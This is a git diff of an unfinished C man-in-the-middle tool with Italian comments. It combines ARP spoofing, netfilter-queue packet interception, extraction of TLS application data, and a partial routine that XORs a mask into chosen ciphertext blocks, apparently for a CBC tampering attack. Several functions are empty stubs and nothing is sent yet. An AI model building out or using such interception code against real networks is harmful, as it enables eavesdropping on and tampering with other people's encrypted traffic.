@@ -22,15 +22,19 @@
 #include <linux/netfilter.h>
 #include <libnetfilter_queue/libnetfilter_queue.h>
 
+//FARE REFACTORING CON Byte
+
 typedef struct Data_packet{
-  unsigned char *packet;
+  Byte *packet;
   unsigned int len;
   struct iphdr *ip_header;
   unsigned int ip_header_len;
   struct tcphdr *tcp_header;
   unsigned int tcp_header_len;
-  unsigned char *data;
+  Byte *data;
   unsigned int data_len;
+  //unsigned int header_data_len; //num of byte of header for data
+  //unsigned int real_data_len; //num of real data byte
 }Data_packet;
 
 void extract_mode();
@@ -43,9 +47,9 @@ void arp_spoofing(char *ip);
 // network
 void setup_nfq(struct nfq_handle **h, struct nfq_q_handle **qh);
 void intercept_packets();
-static inline struct iphdr *extract_ip_header(unsigned char *payload, unsigned int payload_len);
-static inline struct tcphdr *extract_tcp_header(unsigned char *payload, unsigned int payload_len, unsigned int iphdr_len);
-static inline unsigned char *extract_application_data(unsigned char *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size);
+static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payload_len);
+static inline struct tcphdr *extract_tcp_header(Byte *payload, unsigned int payload_len, unsigned int iphdr_len);
+static inline Byte *extract_application_data(Byte *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size);
 
 void *do_attack_thread(void *arg);
 
@@ -92,7 +96,7 @@ int main(int argc, char *argv[]) {
   printf("Operation mode: %c. Network config: %c \n", op_mode, network_config);
 
   extract_mode();
-  extract_network_config();
+  extract_network_config(); 
   catch_signals();
 
   pthread_create(&attack_thread, NULL, do_attack_thread, NULL);
@@ -208,14 +212,14 @@ void intercept_packets() {
 static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){
 
   struct nfqnl_msg_packet_hdr *ph; 
-  unsigned char *payload;
+  Byte *payload;
   unsigned int payload_len;
   uint32_t id;
   struct iphdr *ip_header;
   unsigned int iphdr_size;
   struct tcphdr *tcp_header;
   unsigned int tcphdr_size;
-  unsigned char *application_payload;
+  Byte *application_payload;
   unsigned int application_payload_size;
 
   ph = nfq_get_msg_packet_hdr(nfa);
@@ -248,6 +252,12 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
         printf("Printing of the data \n");
         print_application_data(application_payload, application_payload_size);
 
+        if(check_data_length(application_payload, application_payload_size) == false){
+          fprintf(stderr, "Data length is not correct! \n");
+          return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+        }
+
+        //ALLOCAZIONE ED INIZIALIZZAZIONE DEL PACCHETTO DATA_LENGTH (VARIABILE GLOBALE) E DEI SUOI CAMPI (IP HEADER, TCP HEADER, APPLICATION DATA)
         //allocate memory for the packet
         data_packet->packet = (unsigned char *)malloc(payload_len * sizeof(unsigned char));
         if(!data_packet->packet){
@@ -257,7 +267,6 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
         memcpy(data_packet->packet, payload, payload_len);
         data_packet->len = payload_len;//i need to pass the entire packet to calculate the new checksum
         
-        //qui si verifica un problema 
         //allocate memory for the ip_header
         data_packet->ip_header = (struct iphdr *)malloc(sizeof(struct iphdr));
         if(!data_packet->ip_header){
@@ -305,7 +314,7 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
 }
 
 //function to extract the IP header from the packet payload
-static inline struct iphdr *extract_ip_header(unsigned char *payload, unsigned int payload_len){
+static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payload_len){
   struct iphdr *ip_header;
   if(payload_len < sizeof(struct iphdr)){
     fprintf(stderr, "Payload too small to contain an IP header! \n");
@@ -317,7 +326,7 @@ static inline struct iphdr *extract_ip_header(unsigned char *payload, unsigned i
 }
 
 //function to extract the TCP header from the packet payload
-static inline struct tcphdr *extract_tcp_header(unsigned char *payload, unsigned int payload_len, unsigned int iphdr_len){
+static inline struct tcphdr *extract_tcp_header(Byte *payload, unsigned int payload_len, unsigned int iphdr_len){
   struct tcphdr *tcp_header;
   if(payload_len < (iphdr_len + sizeof(struct tcphdr))){
     fprintf(stderr, "Payload too small to contain a TCP header! \n");
@@ -329,8 +338,8 @@ static inline struct tcphdr *extract_tcp_header(unsigned char *payload, unsigned
 }
 
 //function to extract the application data from the packet payload
-static inline unsigned char *extract_application_data(unsigned char *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size){
-  unsigned char *application_data;
+static inline Byte *extract_application_data(Byte *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size){
+  Byte *application_data;
   if((payload_len <= (iphdr_size + tcphdr_size))){
     fprintf(stderr, "Payload too small to contain application data! \n");
     return NULL;
@@ -341,7 +350,7 @@ static inline unsigned char *extract_application_data(unsigned char *payload, un
 }
 
 //0 -> ssl handshake, 1 --> ssl/tls data packet, 
-int analyze_application_data(unsigned char *payload, int payload_len){
+int analyze_application_data(Byte *payload, int payload_len){
 
 }
 
@@ -352,9 +361,55 @@ int analyze_application_data(unsigned char *payload, int payload_len){
 */
 
 //function to modify the packet
-void modify_packet(unsigned char *payload, unsigned int payload_len){
+void modify_packet(int block_pos, int byte_pos){
+
+  Byte *prec_block = data_packet->data;
+  
+  Byte *bytes_to_add = NULL;
+
+
+  Byte *mask = (Byte *)malloc(sizeof(Byte) * data_packet->data_len);
+  //memset(mask, 0x00 , pos_byte);
+  int i;
+  int num_block = 0;
+
+  //la maschera deve avere tutti i bit a zero tranne i byte che devo modificare
+  for(i=0; i < data_packet->data_len - 5; i++){
+    if(block_pos-1 == num_block && (i >= (num_block * 16 + byte_pos))){
+      mask[i] = data_packet->data[i+5];
+    }else{
+      mask[i] = 0x00;
+    }
+    /*
+    if(i < (num_block * 16 + byte_pos)){ //pos byte va bene solo se si considera un blocco cifrato alla volta e non l'intero pacchetto cifrato
+      mask[i] = 0x00;
+    }else{
+      mask[i] = data_packet->data[i+5];
+    }*/
+    if(i != 0 && i % 16 == 0){
+      num_block++;
+    }
+  }
+ 
+  //xor tra maschera e pacchetto originale
+  Byte *modified_packet = xor_block(prec_block, mask, data_packet->data_len);
+
+  print_blocks(modified_packet, data_packet->data_len);
+
+  /*
+  for(i = 0; i < 16; i++){
+    printf("%02x ", mask[i]);
+  }*/
+
+ // unsigned char *modified_packet = prec_block XOR mask
 
 }
+
+Byte make_mask(){
+  
+}
+
+//TROVARE UNA SOLUZIONE MIGLIORE ALLA GESTIONE DEL -5 SULLA GRANDEZZA DEL PACCHETTO DATA
 
 //function to recalculate the TCP checksum
 void recalculate_checksum(){
@@ -387,12 +442,17 @@ void *do_attack_thread(void *arg){
       //pthread_mutex_unlock(&attack_thread_mutex);
     } 
     printf("Secondo thread avviato\n");
+    /*
     printf("------Packet------ \n");
-    print_application_data(data_packet->data, data_packet->data_len);
+    print_application_data(data_packet->data, data_packet->data_len); */
 
+    printf("- - - - - - -  - - - - - - BLOCCHI - - - -  - - - - -  - - - - - ");
+    //capire come devo modificare il pacchetto e come tenere traccia della posizione del byte da modificare e con quale valore modificarlo
+    print_data_blocks(data_packet->data, data_packet->data_len);
 
     
-    //modify_packet(packet_data);
+    
+    modify_packet(4,14);
     //recalculate_checksum();
     //send_modified_packet();
     //start_timer(); (forse chiamata subito dentro send_modified_packet)
@@ -403,3 +463,6 @@ void *do_attack_thread(void *arg){
   }
 
 }
+
+
+
